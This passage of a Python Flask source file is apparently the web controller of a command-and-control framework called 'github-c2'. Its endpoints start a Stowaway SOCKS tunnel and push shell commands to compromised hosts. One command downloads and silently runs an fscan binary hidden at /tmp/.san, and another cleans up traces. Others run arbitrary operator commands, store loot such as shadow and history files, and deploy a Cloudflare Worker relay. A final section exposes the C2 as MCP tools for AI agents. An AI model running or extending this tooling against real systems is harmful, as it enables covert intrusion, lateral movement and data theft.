        return jsonify({"error": "tunnel_secret not configured"}), 400

    # 注入面封堵：secret/user/pass 只允许无 shell 元字符的字符集；
    # 端口必须数字。随后 tmux 字符串与参数列表两条路径都安全。
    _cred_ok = lambda v: bool(re.fullmatch(r"[A-Za-z0-9_\-@%+=.]{1,64}", v or ""))
    if not (_cred_ok(secret) and _cred_ok(socks_user) and _cred_ok(socks_pass)):
        return jsonify({"error": "secret/socks 凭据含非法字符（仅允许字母数字 _ - @ % + = .）"}), 400
    if not (str(listen_port).isdigit() and str(socks_port).isdigit()):
        return jsonify({"error": "端口必须为数字"}), 400

    cmd = (
        f"{STOWAWAY_BIN} -l 0.0.0.0:{listen_port} -s {secret} --socks-port {socks_port} "
        f"--socks-user {socks_user} --socks-pass {socks_pass}"
    )

    try:
        os.makedirs(STOWAWAY_DIR, exist_ok=True)
        if _has_tmux():
            _subprocess.run(
                ["tmux", "new-session", "-d", "-s", STOWAWAY_TMUX, cmd],
                check=True, timeout=5,
            )
            # write a pid file using the tmux pane PID
            try:
                r = _subprocess.run(
                    ["tmux", "display-message", "-p", "-t", STOWAWAY_TMUX, "#{pane_pid}"],
                    capture_output=True, timeout=3,
                )
                pid = int(r.stdout.strip())
                with open(STOWAWAY_PID, "w") as f:
                    f.write(str(pid))
            except Exception:
                pass
        else:
            proc = _subprocess.Popen(
                [STOWAWAY_BIN, "-l", f"0.0.0.0:{listen_port}", "-s", secret,
                 "--socks-port", str(socks_port), "--socks-user", socks_user,
                 "--socks-pass", socks_pass],
                stdout=open(os.path.join(STOWAWAY_DIR, "stowaway.log"), "a"),
                stderr=_subprocess.STDOUT,
            )
            with open(STOWAWAY_PID, "w") as f:
                f.write(str(proc.pid))
        _stowaway_write_args(listen_port, socks_port, secret, socks_user, socks_pass)
        _audit("stowaway_admin_start", detail=f"listen={listen_port} socks={socks_port}")
        return jsonify({"ok": True, "message": f"Admin started (listen :{listen_port}, socks5 :{socks_port})"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/tunnel/admin/stop", methods=["POST"])
@login_required
def api_stowaway_stop():
    stopped = _stowaway_stop_proc()
    _audit("stowaway_admin_stop", detail=f"stopped={stopped}")
    return jsonify({"ok": True, "message": "Stopped" if stopped else "Not running"})


@app.route("/api/tunnel/admin/status", methods=["GET"])
@login_required
def api_stowaway_status():
    running = _stowaway_running()
    with _lock:
        listen = _state.get("stowaway_listen", "9998")
        socks  = _state.get("stowaway_socks",  "1080")
        secret = _state.get("tunnel_secret", "")

    uptime = None
    if running:
        try:
            with open(STOWAWAY_PID) as f:
                pid = int(f.read().strip())
            uptime = int(time.time() - os.path.getmtime(STOWAWAY_PID))
        except Exception:
            uptime = None

    with _lock:
        s_user = _state.get("stowaway_socks_user", "s5admin")
        s_pass = _state.get("stowaway_socks_pass", "123456")
    live = _stowaway_read_args() if running else {}
    live_listen = live.get("listen") or listen
    live_socks = live.get("socks") or socks
    stale = bool(running and not _stowaway_args_match(
        listen, socks, secret, s_user, s_pass))
    return jsonify({
        "running":      running,
        "listen_port":  listen,
        "socks_port":   socks,
        "live_listen":  live_listen,
        "live_socks":   live_socks,
        "stale":        stale,
        "secret_set":   bool((secret or "").strip()),
        "secret_hint":  _token_hint(secret or ""),
        "uptime_secs":  uptime,
        "tmux_session": STOWAWAY_TMUX,
        "tmux_attach":  f"tmux attach -t {STOWAWAY_TMUX}" if _has_tmux() else None,
        "binary":       STOWAWAY_BIN,
        "has_bin":      os.path.isfile(STOWAWAY_BIN),
    })


# ── API: Scan (fscan) ─────────────────────────────────────────────────────────

def _scan_run_cmd(args: str) -> str:
    """Run existing /tmp/.san with user-provided args (fully user-controlled, daemonized).
    exec >/dev/null closes inherited agent pipe; anchored pkill prevents self-kill."""
    args = args.strip()
    return (
        f"(exec >/dev/null 2>/dev/null; "
        f"if command -v setsid >/dev/null 2>&1; "
        f"then setsid {SCAN_BIN} {args} & "
        f"else nohup {SCAN_BIN} {args} & fi)"
    )


def _scan_deploy_cmd(args: str) -> str:
    """Download /tmp/.san then run with user-provided args (daemonized)."""
    with _lock:
        url = _state.get("scan_url", "").strip()
    if not url.startswith(("http://", "https://")):
        url = ""    # 非法 URL 不下发下载段（命令在目标机 shell 执行，必须消毒）
    url = url.replace(chr(39), chr(39) + chr(92) + chr(39) + chr(39))   # ' -> ''' shell 安全
    args = args.strip()
    return (
        f"(exec >/dev/null 2>/dev/null; "
        f"wget -qO {SCAN_BIN} '{url}' 2>/dev/null || curl -fsSo {SCAN_BIN} '{url}' 2>/dev/null; "
        f"chmod +x {SCAN_BIN} 2>/dev/null; "
        f"if command -v setsid >/dev/null 2>&1; "
        f"then setsid {SCAN_BIN} {args} & "
        f"else nohup {SCAN_BIN} {args} & fi)"
    )


def _scan_sweep_cmd() -> str:
    """Kill /tmp/.san process + remove binary + clean spawned children.
    Output files are user-managed (user chose -o path themselves)."""
    return (
        f"pkill -f '^{SCAN_BIN}' 2>/dev/null; sleep 1; rm -f {SCAN_BIN}; "
        f"_a=$PPID; _s=$$; "
        f"_g=$(ps -o pgid= -p $_a 2>/dev/null | tr -d ' '); "
        f"_pids=$([ -n \"$_g\" ] && ps -eo pid,pgid --no-headers 2>/dev/null | "
        f"awk -v g=$_g -v a=$_a -v s=$_s "
        f"'$2+0==g+0&&$1+0!=a+0&&$1+0!=s+0{{print $1}}'); "
        f"[ -n \"$_pids\" ] && echo \"$_pids\" | xargs -r kill -9 2>/dev/null; "
        f"echo '[scan] cleaned'"
    )


@app.route("/api/scan/config", methods=["GET", "POST"])
@login_required
def api_scan_config():
    if request.method == "GET":
        with _lock:
            return jsonify({"scan_url": _state.get("scan_url", ""),
                            "scan_url_set": bool((_state.get("scan_url") or "").strip())})
    data = request.json or {}
    with _lock:
        if "scan_url" in data:
            val = str(data["scan_url"]).strip() if data["scan_url"] is not None else ""
            if val == "-":
                _state["scan_url"] = ""
            elif val:
                _state["scan_url"] = val
    _save_config()
    return jsonify({"ok": True})


@app.route("/api/scan/deploy", methods=["POST"])
@login_required
def api_scan_deploy():
    data = request.json or {}
    aid  = data.get("agent_id", "")
    args = data.get("args", "").strip()
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    if not args:
        return jsonify({"error": "scan args required"}), 400
    with _lock:
        url = _state.get("scan_url", "").strip()
    if not url:
        return jsonify({"error": "No fscan download URL configured"}), 400
    ok, r = _internal_send(aid, _scan_deploy_cmd(args))
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/scan/run", methods=["POST"])
@login_required
def api_scan_run():
    data = request.json or {}
    aid  = data.get("agent_id", "")
    args = data.get("args", "").strip()
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    if not args:
        return jsonify({"error": "scan args required"}), 400
    ok, r = _internal_send(aid, _scan_run_cmd(args))
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/scan/stop", methods=["POST"])
@login_required
def api_scan_stop():
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    ok, r = _internal_send(aid, f"pkill -f '^{SCAN_BIN}' 2>/dev/null; echo '[scan] stopped'")
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/scan/sweep", methods=["POST"])
@login_required
def api_scan_sweep():
    aid = (request.json or {}).get("agent_id", "")
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    ok, r = _internal_send(aid, _scan_sweep_cmd())
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/scan/result", methods=["POST"])
@login_required
def api_scan_result():
    """Execute a user-specified read command on target and return command_id for SSE interception."""
    data = request.json or {}
    aid  = data.get("agent_id", "")
    cmd  = data.get("cmd", "").strip()
    if not aid:
        return jsonify({"error": "agent_id required"}), 400
    if not cmd:
        return jsonify({"error": "cmd required"}), 400
    ok, r = _internal_send(aid, cmd)
    return (jsonify({"command_id": r}) if ok else jsonify({"error": r}), 200 if ok else 500)


@app.route("/api/scan/save_result/<agent_id>", methods=["POST"])
@login_required
def api_scan_save_result(agent_id):
    """Save scan output to Library/scans/ with a timestamped filename."""
    data    = request.json or {}
    content = data.get("content", "").strip()
    label   = data.get("label", "")          # e.g. "cat /tmp/r.txt"
    if not content:
        return jsonify({"error": "content required"}), 400

    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scans/scan_{ts}.txt"
    lib_dir  = _lib_dir(agent_id)
    try:
        fpath = _safe_path(lib_dir, filename)
    except ValueError:
        return jsonify({"error": "Invalid path"}), 400

    header = f"# Scan Result — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    if label:
        header += f"# Command: {label}\n"
    header += "#" + "-" * 60 + "\n\n"

    os.makedirs(os.path.dirname(fpath), exist_ok=True)
    try:
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(header + content)
        return jsonify({"ok": True, "filename": filename, "abs_path": os.path.abspath(fpath)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── API: Issue cleanup ────────────────────────────────────────────────────────

@app.route("/api/issues/cleanup", methods=["POST"])
@login_required
def api_cleanup_issues():
    with _lock:
        token = _pick_token()
        limit = _state["issue_limit"]
        stale = _state["stale_days"]
        repos = list({a["repo"] for a in _state["agents"]
                      if a.get("channel") == "github" and a.get("repo")}
                     or set(_github_repos_effective()))

    if not token or limit == 0:
        return jsonify({"ok": True, "message": "Cleanup disabled or no token"})

    results = []
    for repo in repos:
        try:
            gh = GitHubClient(token, repo)
            deleted, scanned, details = gh.auto_cleanup(limit, stale)
            if deleted > 0:
                results.append(
                    f"repo={repo}: {deleted} comment(s) deleted "
                    f"(scanned {scanned} total, keeping newest {limit} per agent)"
                )
                results.extend(details)
            else:
                results.append(
                    f"repo={repo}: {scanned} comments scanned, all within limit ({limit})"
                )
        except Exception as e:
            results.append(f"repo={repo}: error {e}")

    return jsonify({"ok": True, "results": results})


# ── Library & Report constants ────────────────────────────────────────────────

TEXT_EXTS = {
    '.txt', '.md', '.py', '.sh', '.bash', '.zsh', '.fish',
    '.json', '.yaml', '.yml', '.toml', '.conf', '.cfg', '.ini',
    '.log', '.csv', '.xml', '.html', '.js', '.css', '.ts',
    '.rs', '.go', '.c', '.cpp', '.h', '.java', '.rb', '.php',
    '.sql', '.env', '.htaccess', '.gitignore', '.dockerfile',
}
MAX_EDIT_BYTES = 512 * 1024  # 512 KB text edit limit

# Known text filenames that have no extension (dotfiles, config files)
_KNOWN_TEXT_NAMES = {
    '.bash_history', '.bash_profile', '.bashrc', '.bash_logout',
    '.zsh_history', '.zshrc', '.zsh_profile', '.zprofile', '.zlogout',
    '.profile', '.shrc', '.kshrc', '.cshrc', '.tcshrc',
    '.ssh/config', 'config', '.vimrc', '.nvimrc', '.inputrc',
    '.screenrc', '.tmux.conf', '.tmux',
    '.gitconfig', '.gitignore', '.npmrc', '.pip.conf', '.yarnrc',
    '.Xresources', '.xinitrc', '.xsession', '.selected_editor',
    '.lesshst', '.mysql_history', '.psql_history', '.python_history',
    '.node_repl_history', '.irb_history', '.pry_history',
    'Makefile', 'makefile', 'Dockerfile', 'Rakefile', 'Procfile',
    'Gemfile', 'Pipfile', 'requirements', 'README', 'LICENSE',
    'CHANGELOG', 'CHANGES', 'AUTHORS', 'COPYING', 'INSTALL',
    '.htpasswd', '.netrc', '.curlrc', '.wgetrc', '.nanorc',
    'crontab', 'fstab', 'hosts', 'passwd', 'shadow', 'sudoers',
    'sshd_config', 'ssh_config', 'motd', 'issue',
}


def _lib_dir(agent_id: str) -> str:
    """Return (and create) the download/library directory for an agent.
    Falls back to scanning downloads/ if agent not in current state."""
    with _lock:
        agent = next((a for a in _state["agents"] if a["id"] == agent_id), None)

    if agent:
        return _agent_download_dir(agent)

    # Fallback: scan downloads dir for folder ending with _<agent_id>
    try:
        for name in os.listdir(DOWNLOADS_DIR):
            if name.endswith(f"_{agent_id}") and os.path.isdir(
                os.path.join(DOWNLOADS_DIR, name)
            ):
                return os.path.join(DOWNLOADS_DIR, name)
    except Exception:
        pass

    # Last resort: create a generic folder
    path = os.path.join(DOWNLOADS_DIR, f"unknown_{agent_id}")
    os.makedirs(path, exist_ok=True)
    return path


def _lib_dir_existing(agent_id: str):
    """Resolve an agent's library dir without creating a new folder."""
    with _lock:
        agent = next((a for a in _state["agents"] if a["id"] == agent_id), None)
    if agent:
        safe = re.sub(r"[^\w\-.]", "_", agent.get("hostname", "unknown"))
        safe_id = re.sub(r"[^\w\-.]", "_", str(agent.get("id", "agent")))
        path = os.path.join(DOWNLOADS_DIR, f"{safe}_{safe_id}")
        return path if os.path.isdir(path) else None
    try:
        for name in os.listdir(DOWNLOADS_DIR):
            if name.endswith(f"_{agent_id}") and os.path.isdir(
                os.path.join(DOWNLOADS_DIR, name)
            ):
                return os.path.join(DOWNLOADS_DIR, name)
    except Exception:
        pass
    path = os.path.join(DOWNLOADS_DIR, f"unknown_{agent_id}")
    return path if os.path.isdir(path) else None


def _lib_dirs(agent_id: str) -> list:
    dirs = []
    for aid in _sibling_ids_for(agent_id):
        d = _lib_dir_existing(aid)
        if d and d not in dirs:
            dirs.append(d)
    return dirs


def _lib_find(agent_id: str, filepath: str):
    for d in _lib_dirs(agent_id):
        try:
            p = _safe_path(d, filepath)
        except ValueError:
            continue
        if os.path.isfile(p):
            return p
    return None


def _is_text(fpath: str) -> bool:
    ext = os.path.splitext(fpath)[1].lower()
    if ext in TEXT_EXTS:
        return True
    # Known text filenames (dotfiles, no-extension config/history files)
    name = os.path.basename(fpath)
    if name.lower() in _KNOWN_TEXT_NAMES:
        return True
    mime, _ = mimetypes.guess_type(fpath)
    if mime and mime.startswith("text/"):
        return True
    # Content sniffing: read first 4 KB, decide by null-byte / UTF-8 ratio
    try:
        size = os.path.getsize(fpath)
        if size == 0:
            return True
        with open(fpath, 'rb') as f:
            chunk = f.read(min(4096, size))
        if b'\x00' in chunk:           # null byte → binary
            return False
        try:
            chunk.decode('utf-8')
            return True
        except UnicodeDecodeError:
            pass
        # Latin-1 always decodes; accept if ≥80% printable / whitespace
        printable = sum(32 <= b < 127 or b in (9, 10, 13) for b in chunk)
        return (printable / len(chunk)) >= 0.80
    except Exception:
        return False


def _safe_path(lib_dir: str, rel: str):
    """Resolve rel path inside lib_dir, raise ValueError on traversal."""
    full    = os.path.normpath(os.path.join(lib_dir, rel))
    base    = os.path.abspath(lib_dir)
    # normcase handles Windows drive-letter and path-separator case differences
    # so that e.g. "C:\Foo" and "c:\foo" compare equal on Windows.
    if not os.path.normcase(full).startswith(os.path.normcase(base) + os.sep) \
            and os.path.normcase(full) != os.path.normcase(base):
        raise ValueError("Path traversal")
    return full


# ── API: Library (per-agent local file storage) ───────────────────────────────

@app.route("/api/library/<agent_id>")
@login_required
def api_library_list(agent_id):
    lib_dirs = _lib_dirs(agent_id) or [_lib_dir(agent_id)]
    files   = []
    seen    = {}
    try:
        for lib_dir in lib_dirs:
            for root, dirs, fnames in os.walk(lib_dir):
                dirs.sort()
                for fname in sorted(fnames):
                    fpath = os.path.join(root, fname)
                    rel   = os.path.relpath(fpath, lib_dir).replace("\\", "/")
                    try:
                        st = os.stat(fpath)
                        prev = seen.get(rel)
                        if prev and prev["mtime"] >= st.st_mtime:
                            continue
                        seen[rel] = {
                            "path":     rel,
                            "name":     fname,
                            "dir":      os.path.relpath(root, lib_dir).replace("\\", "/"),
                            "size":     st.st_size,
                            "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                            "is_text":  _is_text(fpath),
                            "is_note":  rel.startswith("notes/"),
                            "abs_path": os.path.abspath(fpath),
                            "mtime":    st.st_mtime,
                        }
                    except Exception:
                        pass
    except Exception:
        pass
    for item in seen.values():
        item.pop("mtime", None)
        files.append(item)
    files.sort(key=lambda x: x.get("path") or "")
    return jsonify({"files": files, "dir": os.path.abspath(lib_dirs[0])})


@app.route("/api/library/<agent_id>/read/<path:filepath>")
@login_required
def api_library_read(agent_id, filepath):
    fpath = _lib_find(agent_id, filepath)
    if not fpath:
        return jsonify({"error": "Not found"}), 404
    if os.path.getsize(fpath) > MAX_EDIT_BYTES:
        return jsonify({"error": f"File exceeds {MAX_EDIT_BYTES//1024} KB edit limit"}), 413
    if not _is_text(fpath):
        return jsonify({"error": "Binary file — download only"}), 415

    try:
        with open(fpath, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        return jsonify({"content": content, "path": filepath,
                        "abs_path": os.path.abspath(fpath)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/library/<agent_id>/write/<path:filepath>", methods=["PUT"])
@login_required
def api_library_write(agent_id, filepath):
    fpath = _lib_find(agent_id, filepath)
    if not fpath:
        lib_dir = _lib_dir(agent_id)
        try:
            fpath = _safe_path(lib_dir, filepath)
        except ValueError:
            return jsonify({"error": "Invalid path"}), 400

    content  = (request.json or {}).get("content", "")
    is_note  = filepath.startswith("notes/")

    # Notes: if empty after editing, delete the file
    if is_note and not content.strip():
        removed = False
        for d in _lib_dirs(agent_id) or [_lib_dir(agent_id)]:
            try:
                p = _safe_path(d, filepath)
            except ValueError:
                continue
            if os.path.isfile(p):
                try:
                    os.remove(p)
                    removed = True
                except Exception:
                    pass
        return jsonify({"ok": True, "deleted": True,
                        "message": "Empty note deleted" if removed else "Note was already empty"})

    os.makedirs(os.path.dirname(fpath), exist_ok=True)
    try:
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(content)
        return jsonify({"ok": True, "abs_path": os.path.abspath(fpath)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/library/<agent_id>/delete/<path:filepath>", methods=["DELETE"])
@login_required
def api_library_delete(agent_id, filepath):
    removed = False
    last_err = None
    for d in _lib_dirs(agent_id) or [_lib_dir(agent_id)]:
        try:
            fpath = _safe_path(d, filepath)
        except ValueError:
            last_err = "Invalid path"
            continue
        if os.path.isfile(fpath):
            try:
                os.remove(fpath)
                removed = True
            except Exception as e:
                last_err = str(e)
    if removed:
        return jsonify({"ok": True})
    return jsonify({"error": last_err or "Not found"}), 404 if not last_err else 500


@app.route("/api/library/<agent_id>/upload", methods=["POST"])
@login_required
def api_library_upload(agent_id):
    lib_dir = _lib_dir(agent_id)
    subpath = request.form.get("subpath", "").strip("/")
    f       = request.files.get("file")
    if not f:
        return jsonify({"error": "No file provided"}), 400

    dest_dir = lib_dir
    if subpath:
        try:
            dest_dir = _safe_path(lib_dir, subpath)
        except ValueError:
            return jsonify({"error": "Invalid subpath"}), 400

    os.makedirs(dest_dir, exist_ok=True)
    fname = secure_filename(f.filename) or "upload"
    fpath = os.path.join(dest_dir, fname)

    # Avoid overwriting
    if os.path.exists(fpath):
        base, ext = os.path.splitext(fname)
        i = 1
        while os.path.exists(fpath):
            fpath = os.path.join(dest_dir, f"{base}_{i}{ext}")
            i += 1

    f.save(fpath)
    rel = os.path.relpath(fpath, lib_dir).replace("\\", "/")
    return jsonify({"ok": True, "path": rel, "abs_path": os.path.abspath(fpath)})


@app.route("/api/library/<agent_id>/get/<path:filepath>")
@login_required
def api_library_get(agent_id, filepath):
    fpath = _lib_find(agent_id, filepath)
    if not fpath:
        return "Not found", 404
    # ?dl=1 forces download; otherwise serve inline for text (browser can display)
    force_dl = request.args.get("dl") == "1"
    as_attach = force_dl or not _is_text(fpath)
    return send_file(fpath, as_attachment=as_attach, download_name=os.path.basename(fpath))


@app.route("/api/library/<agent_id>/note", methods=["POST"])
@login_required
def api_library_new_note(agent_id):
    lib_dir   = _lib_dir(agent_id)
    notes_dir = os.path.join(lib_dir, "notes")
    os.makedirs(notes_dir, exist_ok=True)

    # Find smallest unused integer ID across sibling library dirs
    existing = set()
    scan_dirs = [notes_dir]
    for d in _lib_dirs(agent_id):
        nd = os.path.join(d, "notes")
        if nd not in scan_dirs:
            scan_dirs.append(nd)
    try:
        for nd in scan_dirs:
            if not os.path.isdir(nd):
                continue
            for fname in os.listdir(nd):
                if fname.endswith(".md"):
                    try:
                        existing.add(int(fname[:-3]))
                    except ValueError:
                        pass
    except Exception:
        pass

    nid = 1
    while nid in existing:
        nid += 1

    fpath = os.path.join(notes_dir, f"{nid}.md")
    open(fpath, "w").close()  # create empty file — will be deleted if user saves nothing
    return jsonify({"path": f"notes/{nid}.md", "id": nid,
                    "abs_path": os.path.abspath(fpath)})


# ── API: Report ───────────────────────────────────────────────────────────────

def _detect_tunnel_active(messages: list) -> bool:
    for m in reversed(messages):
        if not m["is_command"]:
            continue
        c = m["content"]
        if c.startswith("tunnel:close"):
            return False
        if c.startswith("tunnel "):
            return True
    return False


def _detect_tunnel_last_ts(messages: list) -> str:
    for m in reversed(messages):
        if not m["is_command"]:
            continue
        c = m["content"]
        if c.startswith("tunnel") or c.startswith("tunnel:close"):
            return m.get("timestamp", "")
    return ""


# ── Cloudflare Worker admin (one-click relay deployment) ──────────────────────

CF_API = "https://api.cloudflare.com/client/v4"


def _cf_call(token: str, method: str, path: str, json_body=None,
             timeout: int = 30) -> dict:
    """Cloudflare API call. Only talks to the fixed api.cloudflare.com host.
    Returns parsed JSON; raises RuntimeError on API-level failure."""
    r = _requests.request(method, CF_API + path, timeout=timeout,
                          headers={"Authorization": f"Bearer {token}"},
                          json=json_body)
    data = r.json()
    if not data.get("success"):
        errs = "; ".join(e.get("message", "?") for e in data.get("errors", []))
        raise RuntimeError(f"CF API {path}: HTTP {r.status_code} {errs}")
    return data.get("result")


@app.route("/api/worker_admin/state")
@login_required
def api_worker_admin_state():
    conn = _conn()
    tok = db.cfg_get(conn, "cf_api_token") or ""
    return jsonify({
        # masked — the full token never leaves the server once stored
        "cf_token_masked": (tok[:6] + "…" + tok[-4:]) if len(tok) > 12 else ("set" if tok else ""),
        "worker_name": db.cfg_get(conn, "worker_name") or "c2relay",
        "worker_urls": _state.get("worker_urls", ""),
        "worker_secret_set": bool(_state.get("worker_secret")),
        "worker_path_set": bool(_state.get("worker_path")),
        "last_deploy_log": db.cfg_get(conn, "worker_deploy_log") or "",
    })


@app.route("/api/worker_admin/deploy", methods=["POST"])
@login_required
def api_worker_admin_deploy():
    """One-click Cloudflare Worker relay deployment.

    Steps: locate account → ensure D1 database → init schema → upload worker.js
    (D1 binding + C2_AUTH/PATH_SECRET secrets) → hourly cron → enable
    workers.dev → optionally write the relay settings into Settings.
    """
    data     = request.json or {}
    conn     = _conn()
    import secrets as _secrets   # local import matches existing style in app.py
    cf_token = (data.get("cf_token") or db.cfg_get(conn, "cf_api_token") or "").strip()
    name     = (data.get("worker_name") or "c2relay").strip()
    account  = (data.get("account_id") or "").strip()
    auth_s   = ((data.get("auth_secret") or "").strip()
                or (_state.get("worker_secret") or "").strip()
                or _secrets.token_hex(8))
    path_s   = ((data.get("path_secret") or "").strip()
                or (_state.get("worker_path") or "").strip()
                or _secrets.token_hex(6))
    auto_cfg = bool(data.get("auto_save_settings", True))

    if not cf_token:
        return jsonify({"error": "缺少 Cloudflare API Token（页面下方有创建教程）"}), 400

    base = os.path.dirname(os.path.abspath(__file__))
    # web-controller/ 即项目根：Worker 源码在其 cloudflare-worker/ 子目录。
    # 兼容回退：旧开发树的同级 ../cloudflare-worker/、旧 bundle 的
    # web-controller/worker_relay.js 改名副本。
    script_path = next((p for p in (
        os.path.join(base, "cloudflare-worker", "worker.js"),
        os.path.normpath(os.path.join(base, "..", "cloudflare-worker", "worker.js")),
        os.path.join(base, "worker_relay.js"),
    ) if os.path.isfile(p)), "")
    schema_path = next((p for p in (
        os.path.join(base, "cloudflare-worker", "schema.sql"),
        os.path.normpath(os.path.join(base, "..", "cloudflare-worker", "schema.sql")),
        os.path.join(base, "worker_relay_schema.sql"),
    ) if os.path.isfile(p)), "")
    if not script_path or not schema_path:
        return jsonify({"error": "找不到 cloudflare-worker/worker.js 或 schema.sql"}), 500

    steps = []

    def step(msg):
        steps.append(msg)
        debug_log(f"worker_deploy: {msg}")

    try:
        # 1. account
        if not account:
            accounts = _cf_call(cf_token, "GET", "/accounts")
            if not accounts:
                raise RuntimeError("该 Token 看不到任何账户——请按页面教程授予 Account 权限")
            account = accounts[0]["id"]
            step(f"✓ 账户定位：{accounts[0].get('name', account)} ({account[:8]}…)")
        else:
            step(f"✓ 使用指定账户 {account[:8]}…")

        # 2. D1 database (find or create)
        dbs = _cf_call(cf_token, "GET", f"/accounts/{account}/d1/database")
        db_row = next((d for d in dbs if d["name"] == name), None)
        if db_row:
            step(f"✓ D1 数据库已存在：{name}（{db_row['uuid'][:8]}…）")
        else:
            db_row = _cf_call(cf_token, "POST", f"/accounts/{account}/d1/database",
                              {"name": name})
            step(f"✓ D1 数据库创建：{name}")
        db_id = db_row["uuid"]

        # 3. schema (idempotent — CREATE TABLE IF NOT EXISTS)
        schema = open(schema_path, encoding="utf-8").read()
        for stmt in [s.strip() for s in schema.split(";") if s.strip()]:
            _cf_call(cf_token, "POST", f"/accounts/{account}/d1/database/{db_id}/query",
                     {"sql": stmt}, timeout=60)
        step("✓ D1 表结构初始化（幂等）")

        # 4. upload worker script (module + bindings + secrets)
        meta = {
            "main_module": "worker.js",
            "compatibility_date": "2024-09-01",
            "bindings": [
                {"type": "d1", "name": "DB", "id": db_id},
                {"type": "secret_text", "name": "C2_AUTH", "text": auth_s},
                {"type": "secret_text", "name": "PATH_SECRET", "text": path_s},
            ],
        }
        with open(script_path, "rb") as f:
            r = _requests.put(
                f"{CF_API}/accounts/{account}/workers/scripts/{name}",
                timeout=120,
                headers={"Authorization": f"Bearer {cf_token}"},
                files={"metadata": (None, json.dumps(meta), "application/json"),
                       "worker.js": ("worker.js", f, "text/javascript+module")},
            )
        if not r.json().get("success"):
            raise RuntimeError(f"worker 上传失败：HTTP {r.status_code} {r.text[:200]}")
        step(f"✓ Worker 脚本上传：{name}（绑定 D1 + C2_AUTH + PATH_SECRET）")

        # 5. hourly cron
        try:
            _cf_call(cf_token, "PUT", f"/accounts/{account}/workers/scripts/{name}/schedules",
                     [{"cron": "0 * * * *"}])
            step("✓ 每小时 cron 绑定（D1 自动清理）")
        except Exception as e:
            step(f"⚠ cron 绑定失败（不影响使用，手动清理亦可）：{e}")

        # 6. workers.dev enable + URL
        sub = _cf_call(cf_token, "GET", f"/accounts/{account}/workers/subdomain")
        subdomain = sub.get("subdomain", "")
        try:
            _cf_call(cf_token, "POST",
                     f"/accounts/{account}/workers/scripts/{name}/subdomain",
                     {"enabled": True})
            step("✓ workers.dev 访问已启用")
        except Exception:
            pass  # already enabled
        url = f"https://{name}.{subdomain}.workers.dev"
        step(f"✓ 中转地址：{url}/{path_s}/")

        # 7. persist token/name + optionally write relay settings
        db.cfg_set(conn, "cf_api_token", cf_token)
        db.cfg_set(conn, "worker_name", name)
        if auto_cfg:
            with _lock:
                merged = _merge_worker_urls(_state.get("worker_urls") or "", url)
                _state["worker_urls"] = merged
                _state["worker_secret"] = auth_s
                _state["worker_path"] = path_s
            _save_config()
            # Builder reads its OWN builder_worker_* keys — sync them too so
            # the ☁️ Worker channel works there right after deployment.
            # P0-1 fix: must include builder_worker_path — the relay forces
            # /{PATH_SECRET}/ prefix; without it the compiled agent hits /reg
            # and gets 404 → never registers.
            db.cfg_set(conn, "builder_worker_urls", merged)
            db.cfg_set(conn, "builder_worker_secret", auth_s)
            db.cfg_set(conn, "builder_worker_path", path_s)
            # GitHub 单通道编包不再带残留 Worker。一键部署的本意是双通道，
            # 只在第一次把 github/空标成 dual；之后尊重操作员改回的单通道。
            if _promote_builder_to_dual(conn):
                step("✓ 已写入 Settings + Builder Worker 三件套，渠道标为双通道")
            else:
                step("✓ 已写入 Settings + Builder Worker 三件套（主渠道保持原档）")

        log_text = "\n".join(steps)
        db.cfg_set(conn, "worker_deploy_log", log_text)
        _audit("worker_deploy", detail=f"name={name} account={account[:8]}…")
        return jsonify({"ok": True, "steps": steps, "url": url,
                        "full_url": f"{url}/{path_s}/",
                        "secrets_written": bool(auto_cfg)})
    except Exception as e:
        msg = f"✗ 部署失败：{e}"
        steps.append(msg)
        db.cfg_set(conn, "worker_deploy_log", "\n".join(steps))
        return jsonify({"error": msg, "steps": steps}), 500


# ── MCP guide: one-click copyable config for AI agents (openclaw etc.) ────────


def _mcp_descriptor() -> dict:
    """Standard MCP server descriptor, sourced from mcp_server.py itself.

    FastMCP auto-generates the schema; we reconstruct it from the registered
    @app.tool functions for the guide page. Falls back to a static descriptor
    when the mcp package is unavailable (e.g. Windows dev without venv).
    """
    try:
        import mcp_server
        toolset = mcp_server.TOOLSET
        tool_fns = []
        for name in dir(mcp_server):
            if name.startswith("github_c2_"):
                fn = getattr(mcp_server, name)
                if callable(fn) and hasattr(fn, "__doc__"):
                    import inspect
                    sig = inspect.signature(fn)
                    props = {}
                    required = []
                    for pname, param in sig.parameters.items():
                        props[pname] = {"type": "string" if param.annotation is str else "integer" if param.annotation is int else "string"}
                        if param.default is inspect.Parameter.empty:
                            required.append(pname)
                    tool_fns.append({
                        "name": name,
                        "description": (fn.__doc__ or "").strip(),
                        "inputSchema": {"type": "object", "properties": props, "required": required},
                    })
    except Exception:
        toolset = "full"
        tool_fns = [{"name": "github_c2_list_agents", "description": "List agents (see mcp_server.py)"}]
    ver = _read_version()
    return {
        "protocolVersion": "2025-06-18",
        "capabilities":    {"tools": {}},
        "serverInfo":      {"name": "github-c2", "version": "2.0.0",
                            "revision": ver.get("rev", "unknown")},
        "instructions":    f"FastMCP stdio server (Content-Length framed, CyberStrikeAI-compatible). "
                           f"Toolset: {toolset}. Start: python3 mcp_server.py "
                           f"(env C2_CTRL/C2_WEB_USER/C2_WEB_PASS/GITHUB_C2_MCP_TOOLS).",
        "tools": tool_fns,
    }


